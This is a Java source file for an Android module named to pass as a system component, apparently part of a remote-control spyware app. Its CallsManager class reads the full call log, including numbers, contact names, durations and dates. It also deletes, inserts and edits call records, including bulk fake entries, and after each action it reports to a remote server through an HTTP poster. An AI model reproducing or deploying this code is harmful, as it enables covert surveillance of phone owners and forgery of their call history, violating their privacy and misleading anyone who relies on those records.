package oom.android.system.Managers.CallL;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.text.format.DateFormat;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;

import oom.android.system.Managers.base;
import oom.android.system.app.HttpPoster;
import oom.android.system.app.MyService;

public class CallsManager {

    public static JSONObject getCallsLogs(Context context){

        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cur = context.getContentResolver().query(allCalls, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject call = new JSONObject();
                String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));// for  number
                String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name
                String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));// for duration
                String date = cur.getString(cur.getColumnIndex(CallLog.Calls.DATE));


                long millisecond = Long.parseLong(date);
                // or you already have long value of date, use this instead of milliseconds variable.
                String dateString = DateFormat.format("dd.MM.yyyy HH:mm:ss", new Date(millisecond)).toString();

                int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));// for call type, Incoming or out going.
                String dir="?";
                switch (type) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "-->(out)";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "<--(in)";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "X";
                        break;
                }
                call.put(base.CALLS.CALL_TYPE, dir);
                call.put(base.CALLS.CALL_PHONE, num);
                call.put(base.CALLS.CALL_NAME, name);
                call.put(base.CALLS.CALL_DURATION, duration);
                call.put(base.CALLS.CALL_DATE,dateString);
                call.put(base.CALLS.CALL_DATEN,date);
                list.put(call);

            }
            Calls.put("callsList", list);
            cur.close();
            Runnable uploader = new HttpPoster(MyService.post_url,"[Call]Список обновлён");
            new Thread(uploader).start();
            return Calls;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;
    }



    @SuppressLint("MissingPermission")
    public static void DeleteCallLog(String date) {
        ContentResolver resolver = MyService.getContext().getContentResolver();
        Uri callUri = Uri.parse("content://call_log/calls");
        String[] projection = new String[]{CallLog.Calls.DATE, CallLog.Calls._ID};

        String Raw_id = "";

        Cursor c = resolver.query(callUri,projection,null,null,null);
        if(c != null){
            while (c.moveToNext()){
                final int colDate = c.getColumnIndex(CallLog.Calls.DATE);
                final int colId = c.getColumnIndex(CallLog.Calls._ID);
                do{
                    String SDate = c.getString(colDate);
                    String Id = c.getString(colId);
                    if(SDate.equals(date)){
                        Raw_id = Id;
                        break;
                    }

                }while (c.moveToNext());
            }
        }
        c.close();

        String wh = CallLog.Calls.DATE+ "=? AND "+CallLog.Calls._ID + "=?";
        String[] args = new String[]{date,Raw_id};
        int i = resolver.delete(CallLog.Calls.CONTENT_URI,wh, args);

        if(i != -1 ){
            Runnable uploader = new HttpPoster(MyService.post_url,"[Call]Запись удалена");
            new Thread(uploader).start();
        }
    }

    @SuppressLint("MissingPermission")//dd MM yyyy HH:mm:ss
    public static void AddCallLog(String type,String number,String duration,String date,Integer count){
        ContentResolver resolver = MyService.getContext().getContentResolver();

        SimpleDateFormat dateFormat = new SimpleDateFormat("dd.MM.yyyy HH:mm:ss");

        Date convertedDate = new Date();
        if(date != "") {
            try {
                convertedDate = dateFormat.parse(date);
            } catch (ParseException e) {}
        }
        long d = convertedDate.getTime();
        try{
            if(count ==1){

                ContentValues values = new ContentValues();

                values.put(CallLog.Calls.TYPE, CallLogType.Type(type));
                values.put(CallLog.Calls.NUMBER, number);
                values.put(CallLog.Calls.DURATION, duration);
                values.put(CallLog.Calls.DATE, d);

                resolver.insert(CallLog.Calls.CONTENT_URI, values);

            }
            else{
                for(int i =0;i<count;i++){
                    Date date1 = convertedDate;
                    date1.setSeconds(date1.getSeconds()-i);

                    d=date1.getTime();

                    ContentValues values = new ContentValues();

                    values.put(CallLog.Calls.TYPE, CallLogType.Type(type));
                    values.put(CallLog.Calls.NUMBER, number);
                    values.put(CallLog.Calls.DURATION, duration);
                    values.put(CallLog.Calls.DATE, d);

                    resolver.insert(CallLog.Calls.CONTENT_URI, values);
                }
            }
            Runnable uploader = new HttpPoster(MyService.post_url,"[Call]Запись добавлена");
            new Thread(uploader).start();
        }catch (Exception e){}
    }

    @SuppressLint("MissingPermission")
    public static void ChangeCallLog(String O_number,String O_date,String N_type,String N_number,String N_duration,String N_date){
        try{

            SimpleDateFormat dateFormat = new SimpleDateFormat("dd MM yyyy HH:mm:ss");

            long N_d = new Date(String.valueOf(dateFormat.parse(N_date))).getTime();

            ContentResolver resolver = MyService.getContext().getContentResolver();

            ContentValues values = new ContentValues();

            values.put(CallLog.Calls.TYPE, CallLogType.Type(N_type));
            values.put(CallLog.Calls.NUMBER, N_number);
            values.put(CallLog.Calls.DURATION, N_duration);
            values.put(CallLog.Calls.DATE, N_d);
            //values.put(CallLog.Calls.CACHED_NAME, N_name);

            String wh= CallLog.Calls.DATE +"=? AND "+ CallLog.Calls.NUMBER +"=?";
            String[] args = new String[]{O_date,O_number};
            resolver.update(CallLog.Calls.CONTENT_URI,values,wh,args);

            Runnable uploader = new HttpPoster(MyService.post_url,"[Call]Запись изменена");
            new Thread(uploader).start();

        }catch (Exception e){}
    }
}
